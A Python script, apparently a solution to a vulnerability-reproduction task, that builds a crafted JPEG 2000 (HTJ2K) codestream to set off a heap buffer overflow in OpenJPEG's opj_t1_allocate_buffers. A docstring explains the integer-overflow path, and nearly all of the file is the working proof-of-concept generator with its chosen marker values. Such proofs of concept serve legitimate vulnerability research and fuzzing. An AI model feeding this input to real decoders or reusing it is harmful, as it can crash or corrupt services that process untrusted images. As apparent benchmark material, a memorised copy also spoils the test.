import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        The vulnerability is a heap buffer overflow in opj_t1_allocate_buffers
        when handling HTJ2K (High Throughput JPEG 2000) codestreams. The overflow
        is caused by an integer multiplication overflow when calculating the
        buffer size, which is based on code-block dimensions (width * height).

        To trigger this, we construct a J2K codestream with specific parameters:
        1.  Enable JPEG 2000 Part 2 parsing mode by setting Rsiz=33 in the SIZ
            marker. This is crucial because only in this mode does OpenJPEG read
            the 2-byte cblksty field, allowing us to set the HT flag (0x0200).
        2.  Set a large number of decomposition levels (num_dlvls=33) in the COD
            marker. This, combined with large image dimensions, causes internal
            coordinate calculations to overflow 32-bit integers.
        3.  Specify very large image and tile dimensions (e.g., 0x10001) in the
            SIZ marker. Due to the aforementioned coordinate overflow, the clipping
            logic fails, resulting in a code-block with dimensions like 65537x65537.
        4.  Enable the High Throughput (HT) mode by setting the cblksty flag to
            0x0200 in the COD marker. This directs the decoder to the vulnerable
            HT_DEC component path.
        5.  The product of the resulting code-block dimensions (65537 * 65537)
            overflows a 32-bit integer, leading to a small allocation size.
            Subsequent writes to this undersized buffer cause a heap overflow.
        """
        poc = b''

        # SOC Marker: Start of Codestream
        poc += b'\xff\x4f'

        # SIZ Marker: Image and Tile Size
        siz_data = struct.pack(
            '>HIIIIIIIIHBBB',
            33,              # Rsiz: Enable JPEG 2000 Part 2 Profile (key to read 2-byte cblksty)
            0x10001,         # Xsiz: Image width
            0x10001,         # Ysiz: Image height
            0,               # XOsiz: Horizontal image offset
            0,               # YOsiz: Vertical image offset
            0x10001,         # XTsiz: Tile width
            0x10001,         # YTsiz: Tile height
            0,               # XTOsiz: Horizontal tile offset
            0,               # YTOsiz: Vertical tile offset
            1,               # Csiz: Number of components
            7,               # Ssiz_0: 8-bit unsigned
            1,               # XRsiz_0: Horizontal subsampling
            1                # YRsiz_0: Vertical subsampling
        )
        poc += b'\xff\x51' + struct.pack('>H', len(siz_data) + 2) + siz_data

        # COD Marker: Coding Style Default
        num_dlvls = 33
        num_precincts = num_dlvls + 1
        
        scod = b'\x01'  # Scod: Precinct sizes are specified
        
        sgcod = struct.pack('>BHB', 0, 1, 0) # SGcod: Prog order, layers, MCT

        spcod_hdr = struct.pack(
            '>BBBHB',
            num_dlvls,       # SPcod: Number of decomposition levels
            8,               # Code-block width exponent (1024)
            8,               # Code-block height exponent (1024)
            0x0200,          # Code-block style: HT flag enabled
            1                # Wavelet transform: 5/3 reversible
        )
        
        precincts = bytes([0xff] * num_precincts) # Precinct sizes: Max for all levels
        
        cod_data = scod + sgcod + spcod_hdr + precincts
        poc += b'\xff\x52' + struct.pack('>H', len(cod_data) + 2) + cod_data

        # QCD Marker: Quantization Default
        num_bands = 1 + 3 * num_dlvls
        qcd_data = struct.pack('>B', 0x01) + bytes([0x00] * num_bands)
        poc += b'\xff\x5c' + struct.pack('>H', len(qcd_data) + 2) + qcd_data

        # SOT Marker: Start of Tile
        sot_data = struct.pack('>HIBB',
            0,               # Isot: Tile index
            0,               # Psot: Tile-part length (0 = until EOC)
            0,               # TPsot: Tile-part index
            1                # TNsot: Number of tile-parts
        )
        poc += b'\xff\x90' + struct.pack('>H', 10) + sot_data

        # SOD Marker: Start of Data
        poc += b'\xff\x93'

        # EOC Marker: End of Codestream
        poc += b'\xff\xd9'

        return poc